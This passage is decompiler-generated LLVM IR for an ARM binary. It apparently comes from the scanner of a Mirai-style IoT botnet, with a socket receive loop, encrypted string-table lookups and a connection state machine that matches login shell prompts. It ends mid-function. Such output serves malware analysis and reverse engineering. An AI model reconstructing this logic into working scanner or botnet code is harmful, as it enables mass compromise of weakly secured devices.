  %v0_ed00 = load i32, i32* @r4, align 4
  store i32 %v0_ed00, i32* %r0.global-to-local, align 4
  %v1_ed04 = inttoptr i32 %v0_ed00 to i32*
  %v2_ed04 = call i32 @__GI_time(i32* %v1_ed04)
  store i32 %v2_ed04, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2190c.137 to i32), i32* @lr, align 4
  %v0_ed0c = load i32, i32* @r4, align 4
  store i32 %v0_ed0c, i32* %stack_var_-52, align 4
  store i32 %v2_ed04, i32* @global_var_2190c.137, align 4
  br label %dec_label_pc_ed14

dec_label_pc_ed14:                                ; preds = %dec_label_pc_ee7c, %dec_label_pc_ecbc
  %v0_ed20 = phi i32 [ %v1_ee80, %dec_label_pc_ee7c ], [ %v0_ed0c, %dec_label_pc_ecbc ]
  store i32 ptrtoint (i32* @global_var_243f0.149 to i32), i32* %r0.global-to-local, align 4
  %v3_ed18 = mul i32 %v0_ed20, 256
  store i32 %v3_ed18, i32* %r3.global-to-local, align 4
  %v2_ed1c = load i32, i32* @global_var_243f0.149, align 4
  store i32 %v2_ed1c, i32* %r1.global-to-local, align 4
  %v2_ed24 = mul i32 %v0_ed20, 288
  store i32 %v2_ed24, i32* %r2.global-to-local, align 4
  %v2_ed28 = add i32 %v2_ed1c, %v2_ed24
  store i32 %v2_ed28, i32* @r6, align 4
  %v1_ed2c = add i32 %v2_ed28, 4
  %v2_ed2c = inttoptr i32 %v1_ed2c to i32*
  %v3_ed2c = load i32, i32* %v2_ed2c, align 4
  store i32 %v3_ed2c, i32* %r0.global-to-local, align 4
  %v2_ed30 = icmp eq i32 %v3_ed2c, -1
  store i1 %v2_ed30, i1* %cpsr_c.global-to-local, align 1
  %v7_ed30 = icmp eq i32 %v3_ed2c, -1
  store i1 %v7_ed30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ed30, label %dec_label_pc_ee7c, label %dec_label_pc_ed38

dec_label_pc_ed38:                                ; preds = %dec_label_pc_ed14
  %v3_ed38 = udiv i32 %v3_ed2c, 32
  store i32 %v2_ec98, i32* %r1.global-to-local, align 4
  %v3_ed40 = mul nuw nsw i32 %v3_ed38, 4
  store i32 %v3_ed40, i32* @ip, align 4
  %v2_ed44 = add i32 %v3_ed40, %v2_ec98
  store i32 %v2_ed44, i32* %r2.global-to-local, align 4
  %v1_ed48 = add i32 %v2_ed44, -312
  %v2_ed48 = inttoptr i32 %v1_ed48 to i32*
  %v3_ed48 = load i32, i32* %v2_ed48, align 4
  %v1_ed4c = urem i32 %v3_ed2c, 32
  store i32 %v1_ed4c, i32* %r1.global-to-local, align 4
  %v2_ed50 = add nsw i32 %v1_ed4c, -1
  %v3_ed50 = shl i32 1, %v2_ed50
  %v4_ed50 = and i32 %v3_ed48, %v3_ed50
  %v5_ed50 = icmp ne i32 %v4_ed50, 0
  store i1 %v5_ed50, i1* %cpsr_c.global-to-local, align 1
  %v6_ed50 = ashr i32 %v3_ed48, %v1_ed4c
  store i32 %v6_ed50, i32* %r3.global-to-local, align 4
  %v1_ed54 = urem i32 %v6_ed50, 2
  %v2_ed54 = icmp eq i32 %v1_ed54, 0
  store i1 %v2_ed54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ed54, label %dec_label_pc_ed5c, label %dec_label_pc_f884

dec_label_pc_ed5c:                                ; preds = %dec_label_pc_ed38, %dec_label_pc_f930
  %v1_ed68 = phi i32 [ %v1_ed4c, %dec_label_pc_ed38 ], [ %v1_ed68.pre, %dec_label_pc_f930 ]
  %v0_ed60 = phi i32 [ %v3_ed40, %dec_label_pc_ed38 ], [ %v0_ed60.pre, %dec_label_pc_f930 ]
  store i32 %v2_ec98, i32* @lr, align 4
  %v2_ed60 = add i32 %v0_ed60, %v2_ec98
  store i32 %v2_ed60, i32* %r2.global-to-local, align 4
  %v1_ed64 = add i32 %v2_ed60, -184
  %v2_ed64 = inttoptr i32 %v1_ed64 to i32*
  %v3_ed64 = load i32, i32* %v2_ed64, align 4
  %v2_ed68 = add i32 %v1_ed68, -1
  %v3_ed68 = shl i32 1, %v2_ed68
  %v4_ed68 = and i32 %v3_ed64, %v3_ed68
  %v5_ed68 = icmp ne i32 %v4_ed68, 0
  store i1 %v5_ed68, i1* %cpsr_c.global-to-local, align 1
  %v6_ed68 = ashr i32 %v3_ed64, %v1_ed68
  store i32 %v6_ed68, i32* %r3.global-to-local, align 4
  %v1_ed6c = urem i32 %v6_ed68, 2
  %v2_ed6c = icmp eq i32 %v1_ed6c, 0
  store i1 %v2_ed6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ed6c, label %dec_label_pc_ee7c, label %dec_label_pc_ed74.preheader

dec_label_pc_ed74.preheader:                      ; preds = %dec_label_pc_ed5c
  %v0_ed74176 = load i32, i32* @r6, align 4
  %v1_ed74177 = add i32 %v0_ed74176, 12
  %v2_ed74178 = inttoptr i32 %v1_ed74177 to i32*
  %v3_ed74179 = load i32, i32* %v2_ed74178, align 4
  store i32 %v3_ed74179, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ed78175181 = icmp eq i32 %v3_ed74179, 0
  store i1 %v2_ed78175181, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ed78175181, label %dec_label_pc_ee7c, label %dec_label_pc_ed80.lr.ph

dec_label_pc_ed74.loopexit:                       ; preds = %dec_label_pc_f788, %dec_label_pc_f58c
  %v0_ed74 = load i32, i32* @r6, align 4
  %v1_ed74 = add i32 %v0_ed74, 12
  %v2_ed74 = inttoptr i32 %v1_ed74 to i32*
  %v3_ed74 = load i32, i32* %v2_ed74, align 4
  store i32 %v3_ed74, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ed78175 = icmp eq i32 %v3_ed74, 0
  store i1 %v2_ed78175, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ed78175, label %dec_label_pc_ee7c, label %dec_label_pc_ed80.lr.ph

dec_label_pc_ed80.lr.ph:                          ; preds = %dec_label_pc_ed74.preheader, %dec_label_pc_ed74.loopexit
  %v0_ed80231 = phi i32 [ %v0_ed74, %dec_label_pc_ed74.loopexit ], [ %v0_ed74176, %dec_label_pc_ed74.preheader ]
  br label %dec_label_pc_ed80

dec_label_pc_ed80:                                ; preds = %dec_label_pc_ed78.backedge.thread, %dec_label_pc_ed78.backedge, %dec_label_pc_ed78.backedge.thread561, %dec_label_pc_ed80.lr.ph
  %v0_f854 = phi i32 [ %v0_ed80231, %dec_label_pc_ed80.lr.ph ], [ %v0_ed80228, %dec_label_pc_ed78.backedge ], [ %v0_edf4, %dec_label_pc_ed78.backedge.thread ], [ %v0_edf4, %dec_label_pc_ed78.backedge.thread561 ]
  %v1_ed80 = add i32 %v0_f854, 24
  %v2_ed80 = inttoptr i32 %v1_ed80 to i32*
  %v3_ed80 = load i32, i32* %v2_ed80, align 4
  store i32 %v3_ed80, i32* @r3, align 4
  %v2_ed84 = icmp ugt i32 %v3_ed80, 255
  store i1 %v2_ed84, i1* %cpsr_c.global-to-local, align 1
  %v7_ed84 = icmp eq i32 %v3_ed80, 256
  store i1 %v7_ed84, i1* %cpsr_z.global-to-local, align 1
  %.pre282 = add i32 %v0_f854, 28
  store i32 %.pre282, i32* @sb, align 4
  br i1 %v7_ed84, label %dec_label_pc_f854, label %dec_label_pc_ed90

dec_label_pc_ed90:                                ; preds = %dec_label_pc_ed80, %dec_label_pc_f854
  store i32 0, i32* @r5, align 4
  %v1_ed94 = load i32, i32* @fp, align 4
  %v2_ed94 = inttoptr i32 %v1_ed94 to i32*
  store i32 0, i32* %v2_ed94, align 4
  %v0_ed98 = load i32, i32* @r6, align 4
  %v1_ed98 = add i32 %v0_ed98, 24
  %v2_ed98 = inttoptr i32 %v1_ed98 to i32*
  %v3_ed98 = load i32, i32* %v2_ed98, align 4
  store i32 %v3_ed98, i32* %r2.global-to-local, align 4
  %v0_ed9c = load i32, i32* @sb, align 4
  %v2_ed9c = add i32 %v0_ed9c, %v3_ed98
  store i32 %v2_ed9c, i32* @r4, align 4
  %v1_eda0 = add i32 %v0_ed98, 4
  %v2_eda0 = inttoptr i32 %v1_eda0 to i32*
  %v3_eda0 = load i32, i32* %v2_eda0, align 4
  store i32 %v3_eda0, i32* %r0.global-to-local, align 4
  %v1_eda4 = sub i32 256, %v3_ed98
  store i32 %v1_eda4, i32* %r2.global-to-local, align 4
  store i32 %v2_ed9c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_edb0 = call i32 @__libc_recv(i32 %v3_eda0, i32 %v2_ed9c, i32 %v1_eda4, i32 16384)
  store i32 %v4_edb0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_edb4 = icmp eq i32 %v4_edb0, 0
  store i1 %v2_edb4, i1* %cpsr_z.global-to-local, align 1
  %tmp419 = icmp slt i32 %v4_edb0, 1
  br i1 %tmp419, label %dec_label_pc_ee2c, label %dec_label_pc_edbc

dec_label_pc_edbc:                                ; preds = %dec_label_pc_ed90
  %v0_edbc = load i32, i32* @r5, align 4
  store i32 %v0_edbc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_edc0

dec_label_pc_edc0:                                ; preds = %.thread82, %dec_label_pc_edbc
  %v3_edcc = phi i32 [ %v1_edd0, %.thread82 ], [ %v0_edbc, %dec_label_pc_edbc ]
  %v1_edc0 = load i32, i32* @r4, align 4
  %v2_edc0 = add i32 %v1_edc0, %v3_edcc
  %v3_edc0 = inttoptr i32 %v2_edc0 to i8*
  %v4_edc0 = load i8, i8* %v3_edc0, align 1
  %v6_edc0 = zext i8 %v4_edc0 to i32
  store i32 %v6_edc0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_edc4 = icmp eq i8 %v4_edc0, 0
  store i1 %v2_edc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_edc4, label %bb420, label %.thread82

bb420:                                            ; preds = %dec_label_pc_edc0
  %v2_edc8 = add nuw nsw i32 %v6_edc0, 65
  store i32 %v2_edc8, i32* %r3.global-to-local, align 4
  %v2_edcc = trunc i32 %v2_edc8 to i8
  store i8 %v2_edcc, i8* %v3_edc0, align 1
  %v0_edd0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.thread82

.thread82:                                        ; preds = %dec_label_pc_edc0, %bb420
  %v0_edd0 = phi i32 [ %v3_edcc, %dec_label_pc_edc0 ], [ %v0_edd0.pre, %bb420 ]
  %v1_edd0 = add i32 %v0_edd0, 1
  store i32 %v1_edd0, i32* %r2.global-to-local, align 4
  %v3_edd4 = icmp uge i32 %v1_edd0, %v4_edb0
  store i1 %v3_edd4, i1* %cpsr_c.global-to-local, align 1
  %v9_edd4 = icmp eq i32 %v1_edd0, %v4_edb0
  store i1 %v9_edd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_edd4, label %dec_label_pc_eddc, label %dec_label_pc_edc0

dec_label_pc_eddc:                                ; preds = %.thread82, %dec_label_pc_ee30
  store i32 ptrtoint (i32* @global_var_2190c.137 to i32), i32* %r1.global-to-local, align 4
  %v0_ede0 = load i32, i32* @r6, align 4
  %v1_ede0 = add i32 %v0_ede0, 24
  %v2_ede0 = inttoptr i32 %v1_ede0 to i32*
  %v3_ede0 = load i32, i32* %v2_ede0, align 4
  %v2_ede4 = load i32, i32* @global_var_2190c.137, align 4
  store i32 %v2_ede4, i32* %r2.global-to-local, align 4
  %v2_ede8 = add i32 %v3_ede0, %v4_edb0
  store i32 %v2_ede8, i32* %r3.global-to-local, align 4
  store i32 %v2_ede8, i32* %v2_ede0, align 4
  %v0_edf0 = load i32, i32* %r2.global-to-local, align 4
  %v1_edf0 = load i32, i32* @r6, align 4
  %v2_edf0 = add i32 %v1_edf0, 8
  %v3_edf0 = inttoptr i32 %v2_edf0 to i32*
  store i32 %v0_edf0, i32* %v3_edf0, align 4
  br label %dec_label_pc_edf4

dec_label_pc_edf4:                                ; preds = %dec_label_pc_ef10, %dec_label_pc_eddc
  %v0_edf4 = load i32, i32* @r6, align 4
  %v1_edf4 = add i32 %v0_edf4, 12
  %v2_edf4 = inttoptr i32 %v1_edf4 to i32*
  %v3_edf4 = load i32, i32* %v2_edf4, align 4
  store i32 %v3_edf4, i32* %r0.global-to-local, align 4
  %v1_edf8 = add i32 %v3_edf4, -2
  store i32 %v1_edf8, i32* @r3, align 4
  %v7_edfc = icmp eq i32 %v1_edf8, 8
  store i1 %v7_edfc, i1* %cpsr_z.global-to-local, align 1
  %v5_ee00 = and i32 %v1_edf8, 1073741824
  %v6_ee00 = icmp ne i32 %v5_ee00, 0
  store i1 %v6_ee00, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v3_edf4, label %dec_label_pc_ed78.backedge [
    i32 2, label %dec_label_pc_f0e0
    i32 3, label %dec_label_pc_f598
    i32 4, label %dec_label_pc_f4a4
    i32 5, label %dec_label_pc_f284
    i32 6, label %dec_label_pc_f1b0
    i32 7, label %dec_label_pc_f3d0
    i32 8, label %dec_label_pc_f00c
    i32 9, label %dec_label_pc_ef38
    i32 10, label %dec_label_pc_ee94
  ]

dec_label_pc_ee2c:                                ; preds = %dec_label_pc_ed90
  br i1 %v2_edb4, label %dec_label_pc_f984, label %dec_label_pc_ee30

dec_label_pc_ee30:                                ; preds = %dec_label_pc_ee2c
  %v3_ee30 = icmp eq i32 %v4_edb0, -1
  store i1 %v3_ee30, i1* %cpsr_c.global-to-local, align 1
  %v8_ee30 = icmp eq i32 %v4_edb0, -1
  store i1 %v8_ee30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ee30, label %dec_label_pc_ee38, label %dec_label_pc_eddc

dec_label_pc_ee38:                                ; preds = %dec_label_pc_ee30
  %v0_ee38 = load i32, i32* @fp, align 4
  %v1_ee38 = inttoptr i32 %v0_ee38 to i32*
  %v2_ee38 = load i32, i32* %v1_ee38, align 4
  store i32 %v2_ee38, i32* %r3.global-to-local, align 4
  %v2_ee3c = icmp ugt i32 %v2_ee38, 10
  store i1 %v2_ee3c, i1* %cpsr_c.global-to-local, align 1
  %v7_ee3c = icmp eq i32 %v2_ee38, 11
  store i1 %v7_ee3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee3c, label %dec_label_pc_ee7c, label %dec_label_pc_ee44

dec_label_pc_ee44:                                ; preds = %dec_label_pc_ee38, %dec_label_pc_f984
  %v0_ee44 = load i32, i32* @r6, align 4
  %v1_ee44 = add i32 %v0_ee44, 4
  %v2_ee44 = inttoptr i32 %v1_ee44 to i32*
  %v3_ee44 = load i32, i32* %v2_ee44, align 4
  store i32 %v3_ee44, i32* %r0.global-to-local, align 4
  %v1_ee48 = call i32 @__GI___libc_close(i32 %v3_ee44)
  store i32 %v1_ee48, i32* %r0.global-to-local, align 4
  %v0_ee4c = load i32, i32* @r6, align 4
  %v1_ee4c = add i32 %v0_ee4c, 284
  %v2_ee4c = inttoptr i32 %v1_ee4c to i8*
  %v3_ee4c = load i8, i8* %v2_ee4c, align 1
  %v4_ee4c = zext i8 %v3_ee4c to i32
  %v1_ee50 = add nuw nsw i32 %v4_ee4c, 1
  %v1_ee54 = urem i32 %v1_ee50, 256
  store i32 %v1_ee54, i32* %r3.global-to-local, align 4
  %v2_ee58 = icmp ugt i32 %v1_ee54, 8
  store i1 %v2_ee58, i1* %cpsr_c.global-to-local, align 1
  %v7_ee58 = icmp eq i32 %v1_ee54, 9
  store i1 %v7_ee58, i1* %cpsr_z.global-to-local, align 1
  %v1_ee5c = trunc i32 %v1_ee50 to i8
  store i8 %v1_ee5c, i8* %v2_ee4c, align 1
  store i32 -1, i32* %r2.global-to-local, align 4
  %v0_ee64 = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_ee64 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_ee64 = xor i1 %v1_ee64, true
  %v3_ee64 = and i1 %v0_ee64, %v2_ee64
  br i1 %v3_ee64, label %bb421, label %.thread313

.thread313:                                       ; preds = %dec_label_pc_ee44
  %v1_ee68309314 = load i32, i32* @r6, align 4
  %v2_ee68310315 = add i32 %v1_ee68309314, 4
  %v3_ee68311316 = inttoptr i32 %v2_ee68310315 to i32*
  store i32 -1, i32* %v3_ee68311316, align 4
  br label %bb422

bb421:                                            ; preds = %dec_label_pc_ee44
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_ee68305 = load i32, i32* @r6, align 4
  %v2_ee68306 = add i32 %v1_ee68305, 4
  %v3_ee68307 = inttoptr i32 %v2_ee68306 to i32*
  store i32 -1, i32* %v3_ee68307, align 4
  %v4_ee6c = load i32, i32* %r3.global-to-local, align 4
  %v5_ee6c = load i32, i32* @r6, align 4
  %v6_ee6c = add i32 %v5_ee6c, 12
  %v7_ee6c = inttoptr i32 %v6_ee6c to i32*
  store i32 %v4_ee6c, i32* %v7_ee6c, align 4
  %v4_ee70 = load i32, i32* %r3.global-to-local, align 4
  %v5_ee70 = trunc i32 %v4_ee70 to i8
  %v6_ee70 = load i32, i32* @r6, align 4
  %v7_ee70 = add i32 %v6_ee70, 284
  %v8_ee70 = inttoptr i32 %v7_ee70 to i8*
  store i8 %v5_ee70, i8* %v8_ee70, align 1
  %v0_ee74.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_ee74.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb422

bb422:                                            ; preds = %.thread313, %bb421
  %v1_ee78 = phi i1 [ %v1_ee74.pre, %bb421 ], [ %v0_ee64, %.thread313 ]
  %v0_ee78 = phi i1 [ %v0_ee74.pre, %bb421 ], [ %v1_ee64, %.thread313 ]
  %v2_ee74 = xor i1 %v1_ee78, true
  %v3_ee74 = or i1 %v0_ee78, %v2_ee74
  br i1 %v3_ee74, label %bb423, label %bb424

bb423:                                            ; preds = %bb422
  %v4_ee74 = load i32, i32* @r6, align 4
  store i32 %v4_ee74, i32* %r0.global-to-local, align 4
  br label %bb424

bb424:                                            ; preds = %bb422, %bb423
  store i32 61052, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_ee74, i32 ptrtoint (i32* @global_var_e168.201 to i32))
  br label %dec_label_pc_ee7c

dec_label_pc_ee7c:                                ; preds = %dec_label_pc_ed74.loopexit, %dec_label_pc_ed78.backedge, %dec_label_pc_ed74.preheader, %dec_label_pc_ee38, %dec_label_pc_ed5c, %dec_label_pc_ed14, %dec_label_pc_f968, %bb424
  %v3_ee7c = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_ee7c, i32* %r3.global-to-local, align 4
  %v1_ee80 = add i32 %v3_ee7c, 1
  store i32 %v1_ee80, i32* @r4, align 4
  %v2_ee84 = icmp ugt i32 %v1_ee80, 254
  store i1 %v2_ee84, i1* %cpsr_c.global-to-local, align 1
  %v7_ee84 = icmp eq i32 %v1_ee80, 255
  store i1 %v7_ee84, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ee80, i32* %stack_var_-52, align 4
  %v7_ee8c = icmp slt i32 %v1_ee80, 256
  br i1 %v7_ee8c, label %dec_label_pc_ed14, label %dec_label_pc_e694

dec_label_pc_ee94:                                ; preds = %dec_label_pc_edf4
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_ee98 = call i32 @table_unlock_val(i32 10)
  store i32 %v2_f628, i32* %r1.global-to-local, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v3_eea8 = call i32 @table_retrieve_val(i32 10, i32* nonnull %stack_var_-60)
  %v3_eeac = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_eea8, i32* %r2.global-to-local, align 4
  %v1_eeb4 = add i32 %v3_eeac, -1
  store i32 %v1_eeb4, i32* %r3.global-to-local, align 4
  %v0_eeb8 = load i32, i32* @sb, align 4
  store i32 %v0_eeb8, i32* %r0.global-to-local, align 4
  %v0_eebc = load i32, i32* @r6, align 4
  %v1_eebc = add i32 %v0_eebc, 24
  %v2_eebc = inttoptr i32 %v1_eebc to i32*
  %v3_eebc = load i32, i32* %v2_eebc, align 4
  store i32 %v3_eebc, i32* %r1.global-to-local, align 4
  %v4_eec0 = call i32 @util_memsearch(i32 %v0_eeb8, i32 %v3_eebc, i32 %v3_eea8, i32 %v1_eeb4)
  %v2_eec4 = icmp eq i32 %v4_eec0, -1
  store i1 %v2_eec4, i1* %cpsr_c.global-to-local, align 1
  %v7_eec4 = icmp eq i32 %v4_eec0, -1
  store i1 %v7_eec4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_eec0, i32* @r4, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_f78c = call i32 @table_lock_val(i32 10)
  br i1 %v7_eec4, label %dec_label_pc_f788, label %dec_label_pc_eed0

dec_label_pc_eed0:                                ; preds = %dec_label_pc_ee94
  store i32 %v1_f78c, i32* %r0.global-to-local, align 4
  %v0_eed8 = load i32, i32* @r6, align 4
  %v1_eed8 = add i32 %v0_eed8, 4
  %v2_eed8 = inttoptr i32 %v1_eed8 to i32*
  %v3_eed8 = load i32, i32* %v2_eed8, align 4
  store i32 %v3_eed8, i32* %r0.global-to-local, align 4
  %v1_eedc = call i32 @__GI___libc_close(i32 %v3_eed8)
  store i32 %v1_eedc, i32* %r0.global-to-local, align 4
  %v0_eee0 = load i32, i32* @r6, align 4
  %v1_eee0 = add i32 %v0_eee0, 284
  %v2_eee0 = inttoptr i32 %v1_eee0 to i8*
  %v3_eee0 = load i8, i8* %v2_eee0, align 1
  %v4_eee0 = zext i8 %v3_eee0 to i32
  %v1_eee4 = add nuw nsw i32 %v4_eee0, 1
  %v1_eee8 = urem i32 %v1_eee4, 256
  store i32 %v1_eee8, i32* @r3, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_eef0 = icmp ugt i32 %v1_eee8, 9
  store i1 %v2_eef0, i1* %cpsr_c.global-to-local, align 1
  %v7_eef0 = icmp eq i32 %v1_eee8, 10
  store i1 %v7_eef0, i1* %cpsr_z.global-to-local, align 1
  %v2_eef4 = add i32 %v0_eee0, 4
  %v3_eef4 = inttoptr i32 %v2_eef4 to i32*
  store i32 -1, i32* %v3_eef4, align 4
  %v0_eef8 = load i32, i32* @r3, align 4
  %v1_eef8 = trunc i32 %v0_eef8 to i8
  %v2_eef8 = load i32, i32* @r6, align 4
  %v3_eef8 = add i32 %v2_eef8, 284
  %v4_eef8 = inttoptr i32 %v3_eef8 to i8*
  store i8 %v1_eef8, i8* %v4_eef8, align 1
  %v0_eefc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_eefc, label %dec_label_pc_ef00, label %dec_label_pc_f878

dec_label_pc_ef00:                                ; preds = %dec_label_pc_eed0
  store i32 0, i32* @r3, align 4
  %v1_ef04 = load i32, i32* @r6, align 4
  %v2_ef04 = add i32 %v1_ef04, 12
  %v3_ef04 = inttoptr i32 %v2_ef04 to i32*
  store i32 0, i32* %v3_ef04, align 4
  %v0_ef08 = load i32, i32* @r3, align 4
  %v1_ef08 = trunc i32 %v0_ef08 to i8
  %v2_ef08 = load i32, i32* @r6, align 4
  %v3_ef08 = add i32 %v2_ef08, 284
  %v4_ef08 = inttoptr i32 %v3_ef08 to i8*
  store i8 %v1_ef08, i8* %v4_ef08, align 1
  br label %dec_label_pc_ef0c

dec_label_pc_ef0c:                                ; preds = %dec_label_pc_f878, %dec_label_pc_ef00
  store i32 -1, i32* @r7, align 4
  br label %dec_label_pc_ef10

dec_label_pc_ef10:                                ; preds = %dec_label_pc_f58c, %dec_label_pc_f44c, %dec_label_pc_f300, %dec_label_pc_f22c, %dec_label_pc_f088, %dec_label_pc_efb4, %dec_label_pc_ef0c
  %v0_ef10 = load i32, i32* @r6, align 4
  %v1_ef10 = add i32 %v0_ef10, 24
  %v2_ef10 = inttoptr i32 %v1_ef10 to i32*
  %v3_ef10 = load i32, i32* %v2_ef10, align 4
  %v0_ef14 = load i32, i32* @r7, align 4
  %v2_ef14 = sub i32 %v0_ef14, %v3_ef10
  %v3_ef14 = icmp uge i32 %v0_ef14, %v3_ef10
  store i1 %v3_ef14, i1* %cpsr_c.global-to-local, align 1
  %v4_ef14 = xor i32 %v0_ef14, %v3_ef10
  %v5_ef14 = xor i32 %v2_ef14, %v0_ef14
  %v6_ef14 = and i32 %v5_ef14, %v4_ef14
  %v7_ef14 = icmp slt i32 %v6_ef14, 0
  %v8_ef14 = icmp slt i32 %v2_ef14, 0
  %v9_ef14 = icmp eq i32 %v0_ef14, %v3_ef10
  store i1 %v9_ef14, i1* %cpsr_z.global-to-local, align 1
  %v2_ef18 = xor i1 %v8_ef14, %v7_ef14
  %v0_ef14.v3_ef10 = select i1 %v2_ef18, i32 %v0_ef14, i32 %v3_ef10
  store i32 %v0_ef14.v3_ef10, i32* %r1.global-to-local, align 4
  %v2_ef20 = sub i32 %v3_ef10, %v0_ef14.v3_ef10
  store i32 %v2_ef20, i32* @r2, align 4
  store i32 %v2_ef20, i32* %v2_ef10, align 4
  %v0_ef28 = load i32, i32* @sb, align 4
  %v1_ef28 = load i32, i32* %r1.global-to-local, align 4
  %v2_ef28 = add i32 %v1_ef28, %v0_ef28
  store i32 %v2_ef28, i32* @r1, align 4
  store i32 %v0_ef28, i32* @r0, align 4
  %v3_ef30 = call i32 @memmove(i32 %v0_ef28, i32 %v2_ef28, i32 %v2_ef20)
  store i32 %v3_ef30, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_edf4

dec_label_pc_ef38:                                ; preds = %dec_label_pc_edf4
  %v1_ef38 = add i32 %v0_edf4, 24
  %v2_ef38 = inttoptr i32 %v1_ef38 to i32*
  %v3_ef38 = load i32, i32* %v2_ef38, align 4
  store i32 %v3_ef38, i32* %r2.global-to-local, align 4
  %v1_ef3c = add i32 %v3_ef38, -1
  store i32 %v1_ef3c, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ef40 = icmp eq i32 %v1_ef3c, 0
  store i1 %v2_ef40, i1* %cpsr_z.global-to-local, align 1
  %tmp427 = icmp slt i32 %v1_ef3c, 1
  br i1 %tmp427, label %dec_label_pc_ed78.backedge.thread, label %dec_label_pc_ef48

dec_label_pc_ef48:                                ; preds = %dec_label_pc_ef38
  %v2_ef48 = add i32 %v1_ef3c, %v0_edf4
  store i32 %v2_ef48, i32* %r3.global-to-local, align 4
  %v1_ef4c = add i32 %v2_ef48, 28
  %v2_ef4c = inttoptr i32 %v1_ef4c to i8*
  %v3_ef4c = load i8, i8* %v2_ef4c, align 1
  %v4_ef4c = zext i8 %v3_ef4c to i32
  store i32 %v4_ef4c, i32* %r3.global-to-local, align 4
  %v2_ef50 = icmp ugt i8 %v3_ef4c, 61
  store i1 %v2_ef50, i1* %cpsr_c.global-to-local, align 1
  %v7_ef50 = icmp eq i8 %v3_ef4c, 62
  store i1 %v7_ef50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef50, label %dec_label_pc_efb4, label %bb428

bb428:                                            ; preds = %dec_label_pc_ef48
  %v3_ef54 = icmp ugt i8 %v3_ef4c, 57
  store i1 %v3_ef54, i1* %cpsr_c.global-to-local, align 1
  %v8_ef54 = icmp eq i8 %v3_ef4c, 58
  store i1 %v8_ef54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ef54, label %dec_label_pc_efb4, label %dec_label_pc_ef5c

dec_label_pc_ef5c:                                ; preds = %bb428
  %v2_ef5c = icmp ugt i8 %v3_ef4c, 35
  store i1 %v2_ef5c, i1* %cpsr_c.global-to-local, align 1
  %v7_ef5c = icmp eq i8 %v3_ef4c, 36
  store i1 %v7_ef5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef5c, label %dec_label_pc_efb4, label %dec_label_pc_ef64

dec_label_pc_ef64:                                ; preds = %dec_label_pc_ef5c
  %v2_ef64 = icmp ugt i8 %v3_ef4c, 34
  store i1 %v2_ef64, i1* %cpsr_c.global-to-local, align 1
  %v7_ef64 = icmp eq i8 %v3_ef4c, 35
  store i1 %v7_ef64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef64, label %dec_label_pc_efb4, label %dec_label_pc_ef6c

dec_label_pc_ef6c:                                ; preds = %dec_label_pc_ef64
  %v2_ef6c = icmp ugt i8 %v3_ef4c, 36
  store i1 %v2_ef6c, i1* %cpsr_c.global-to-local, align 1
  %v7_ef6c = icmp eq i8 %v3_ef4c, 37
  store i1 %v7_ef6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef6c, label %dec_label_pc_efb4, label %dec_label_pc_ef9c.preheader

dec_label_pc_ef9c.preheader:                      ; preds = %dec_label_pc_ef6c
  %v3_ef70 = add i32 %v0_edf4, 28
  %v2_ef74 = add i32 %v3_ef70, %v3_ef38
  store i32 %v2_ef74, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ef9c

dec_label_pc_ef80:                                ; preds = %bb429
  %v2_ef80 = icmp ugt i8 %v3_efa4, 35
  store i1 %v2_ef80, i1* %cpsr_c.global-to-local, align 1
  %v7_ef80 = icmp eq i8 %v3_efa4, 36
  store i1 %v7_ef80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef80, label %dec_label_pc_efb4, label %dec_label_pc_ef88

dec_label_pc_ef88:                                ; preds = %dec_label_pc_ef80
  %v2_ef88 = icmp ugt i8 %v3_efa4, 34
  store i1 %v2_ef88, i1* %cpsr_c.global-to-local, align 1
  %v7_ef88 = icmp eq i8 %v3_efa4, 35
  store i1 %v7_ef88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef88, label %dec_label_pc_efb4, label %dec_label_pc_ef90

dec_label_pc_ef90:                                ; preds = %dec_label_pc_ef88
  %v2_ef90 = icmp ugt i8 %v3_efa4, 36
